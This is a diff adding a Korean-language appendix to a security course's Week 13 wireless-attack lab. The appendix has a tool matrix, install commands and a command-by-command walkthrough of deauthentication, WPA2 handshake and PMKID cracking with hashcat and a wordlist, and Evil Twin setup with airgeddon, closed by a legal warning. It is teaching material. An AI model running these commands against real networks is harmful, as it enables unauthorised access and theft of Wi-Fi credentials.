@@ -448,3 +448,90 @@ Part 4의 35개 기법을 **본인이 직접 실습한 증거**(스크린샷·ev
 3. Kill Chain ↔ ATT&CK 매핑 표를 *시간순* 으로 정렬 → 공격의 *시간 흐름* 시각화
 
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 13 무선 네트워크)
+
+| 기법 | lab step | 본문 도구 | OSS 도구 옵션 | 비고 |
+|------|----------|----------|---------------|------|
+| 무선 인터페이스 모니터 모드 | s1 | `airmon-ng start wlan0` | aircrack-ng suite / iw / airmon-ng | iwconfig 도 가능 |
+| AP 스캔 | s2 | `airodump-ng wlan0mon` | airodump-ng / kismet / wifite -i | kismet GUI |
+| Probe 요청 sniff | s3 | `airodump-ng -d` | airodump-ng / hcxdumptool / kismet | hcxdumptool 권장 |
+| 4-way Handshake 캡처 | s4 | `airodump-ng -c <ch> --bssid <ap> -w cap` | airodump-ng / hcxdumptool | hcxdumptool = 새 패킷 형식 |
+| Deauth 공격 | s5 | `aireplay-ng --deauth` | aireplay-ng / mdk4 / wifite | mdk4 다양 |
+| WPA2 크래킹 | s6 | `aircrack-ng -w wordlist cap` | aircrack-ng / hashcat -m 22000 / john | hashcat GPU 권장 |
+| WPS 공격 | s7 | `reaver / bully` | reaver / bully / wifite | WPS PIN brute |
+| Evil Twin AP | s8 | `hostapd / airbase-ng` | hostapd-mana / airgeddon / WiFi-Pumpkin3 | airgeddon = all-in-one |
+| Captive Portal 피싱 | s9 | `dnsmasq + apache` | airgeddon / WiFi-Pumpkin / fluxion | fluxion = 자동 |
+| PMKID 공격 (clientless) | s10 | `hcxdumptool` | hcxdumptool + hashcat -m 16800 | client 없이 가능 |
+| Karma (probe spoof) | s11 | `mana-toolkit` | hostapd-mana / WiFi-Pumpkin / KARMA | |
+| Bluetooth recon | s12 | `bluetoothctl / hcitool` | bluetoothctl / blueranger / blue_hydra | |
+| BLE 스캔 | s13 | `gatttool` | bettercap ble.recon / bluez-utils | bettercap 통합 |
+| 보고 | s15 | text | wifite — auto report / aircrack 출력 | |
+
+### 학생 환경 준비 (한 번만 실행, **무선 카드 + 모니터 모드 지원** 필요)
+
+```bash
+ssh ccc@192.168.0.112
+
+sudo apt update && sudo apt install -y \
+  aircrack-ng kismet wifite \
+  reaver bully \
+  hostapd dnsmasq \
+  hcxdumptool hcxtools \
+  mdk4 \
+  bluez bluez-tools \
+  hashcat john
+
+# airgeddon — all-in-one (zsh)
+git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git ~/airgeddon
+
+# WiFi-Pumpkin3 (rogue AP framework)
+git clone https://github.com/P0cL4bs/wifipumpkin3.git ~/wifipumpkin3
+cd ~/wifipumpkin3 && pip3 install -r requirements.txt
+
+# fluxion — Evil Twin 자동
+git clone https://github.com/FluxionNetwork/fluxion.git ~/fluxion
+
+# 무선 카드 확인 (모니터 모드 지원)
+iw list | grep -A 20 "Supported interface modes"
+# "monitor" 가 있어야 함
+```
+
+### 핵심 시나리오
+
+```bash
+# 1) 모니터 모드
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0          # → wlan0mon 생성
+
+# 2) AP 발견 + 채널 확인
+sudo airodump-ng wlan0mon
+
+# 3) 특정 AP 의 Handshake 캡처
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/cap wlan0mon
+# 다른 터미널에서 deauth (client 강제 재인증)
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# 4) 크래킹 (CPU)
+aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/cap-01.cap
+
+# 5) 크래킹 (GPU — 빠름)
+hcxpcapngtool -o /tmp/hash22000.hc22000 /tmp/cap-01.cap
+hashcat -m 22000 -a 0 /tmp/hash22000.hc22000 /usr/share/wordlists/rockyou.txt
+
+# 6) PMKID 공격 (clientless)
+sudo hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=15
+# 짧은 시간 내 PMKID 캡처되면 22000 해시 변환
+hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng
+hashcat -m 22000 /tmp/pmkid.hc22000 /usr/share/wordlists/rockyou.txt
+
+# 7) Evil Twin (airgeddon, 인터랙티브)
+sudo bash ~/airgeddon/airgeddon.sh
+# 메뉴 → 선택 인터페이스 → Evil Twin Attacks
+```
+
+학생은 본 13주차에서 **WPA2 크래킹 (handshake + GPU 해시)** + **PMKID 공격 (clientless)** + **Evil Twin (rogue AP)** 의 3 핵심 패턴을 도구로 익힌다.
+
+> ⚠ **법적 경고**: 무선 공격은 본인 소유 또는 명시적 허가받은 AP 에만 허용. 공공 Wi-Fi/타인 AP 는 형사처벌 대상.
